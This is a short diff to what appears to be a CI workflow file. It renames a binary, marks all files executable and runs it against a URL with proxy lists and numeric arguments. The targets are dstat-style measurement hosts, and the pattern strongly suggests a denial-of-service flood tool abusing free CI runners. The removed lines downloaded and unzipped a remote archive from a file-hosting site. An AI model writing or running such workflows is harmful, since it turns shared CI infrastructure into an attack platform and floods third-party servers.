@@ -35,15 +35,13 @@ jobs:
           mv  Fc-main/proxy.txt 90.txt
           mv proxy.txt lynd
           chmod +x *
-          mv tol o   
-          wget https://files.catbox.moe/bc9clx.zip
-          unzip bc9clx.zip
+          mv ki o   
           
           
           
            
           
-          ./o https://ip-count.dstat.uk/ 350 1 1 proxylist.txt
+          ./o https://c2.dstatbot.win/191dCAxa  350 1 1 
           
 
           
